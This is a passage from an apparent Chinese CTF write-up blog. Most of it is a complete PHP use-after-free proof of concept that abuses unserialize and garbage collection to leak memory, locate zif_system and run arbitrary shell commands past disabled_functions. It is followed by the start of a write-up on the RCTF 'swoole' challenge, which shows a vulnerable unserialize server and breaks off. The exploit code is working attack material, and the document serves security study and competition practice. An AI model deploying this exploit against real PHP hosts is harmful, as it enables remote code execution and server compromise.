punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_Write</span>                <span class="token shell-comment comment"># handle pie</span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># PT_LOAD, PF_Read_exec</span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># </span><span class="token string">'constant'</span> constant check                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># </span><span class="token string">'bin2hex'</span> constant check                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># ELF header</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">{</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token shell-comment comment"># system</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">ryat</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> <span class="token variable">$ryat</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$chtg</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">chtg</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ryat</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Helper</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># increase this value if you get segfaults</span>    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$poc</span> <span class="token operator">=</span> <span class="token string">'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}'</span><span class="token punctuation">;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$poc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gc_collect_cycles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ptr2str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$out</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># leaks</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake value</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake reference</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># fake closure object</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># pwn</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func type</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func handler</span>    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/30/2020-gyctf/tp5.png" alt="提权"></p><p>访问：runtime/session/exp.php得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020_RCTF</title>
      <link href="/2020/05/30/2020-rctf/"/>
      <url>/2020/05/30/2020-rctf/</url>
      
        <content type="html"><![CDATA[<h1 id="1-swoole"><a href="#1-swoole" class="headerlink" title="1.  swoole"></a>1.  swoole</h1><p><strong>题目链接：</strong></p><p>Make unserialize great again<br><a href="https://swoole.rctf2020.rois.io" target="_blank" rel="noopener">https://swoole.rctf2020.rois.io</a> </p><p><strong>hint：</strong><a href="https://github.com/swoole/library/issues/34" target="_blank" rel="noopener">https://github.com/swoole/library/issues/34</a></p><p><strong>参考资料：</strong></p><p><strong>1、</strong> Swoole4  <a href="https://wiki.swoole.com/#/start/coroutine?id=%e4%bd%bf%e7%94%a8%e5%8d%8f%e7%a8%8b%e4%bd%a0%e5%8f%af%e4%bb%a5%e5%9c%a8%e4%b8%80%e7%a7%92%e9%92%9f%e9%87%8c%e5%81%9a%e5%a4%9a%e5%b0%91%e4%ba%8b" target="_blank" rel="noopener">https://wiki.swoole.com/#/start/coroutine?id=%e4%bd%bf%e7%94%a8%e5%8d%8f%e7%a8%8b%e4%bd%a0%e5%8f%af%e4%bb%a5%e5%9c%a8%e4%b8%80%e7%a7%92%e9%92%9f%e9%87%8c%e5%81%9a%e5%a4%9a%e5%b0%91%e4%ba%8b</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#!/usr/bin/env php</span><span class="token delimiter">&lt;?php</span>Swoole\<span class="token package">Runtime</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">enableCoroutine</span><span class="token punctuation">(</span><span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token constant">SWOOLE_HOOK_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$http</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Swoole<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Server</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">9501</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$http</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">,</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span>Swoole\<span class="token package">Http<span class="token punctuation">\</span>Request</span> <span class="token variable">$request</span><span class="token punctuation">,</span> Swoole\<span class="token package">Http<span class="token punctuation">\</span>Response</span> <span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Swoole\<span class="token package">Runtime</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">enableCoroutine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// $response->sendfile('/flag');</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">get</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Prevent racing condition</span>            <span class="token comment" spellcheck="true">// ob_start();phpinfo();</span>            <span class="token comment" spellcheck="true">// return $response->end(ob_get_clean());</span>            <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">sendfile</span><span class="token punctuation">(</span><span class="token string">'phpinfo.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">get</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">get</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\x00/'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            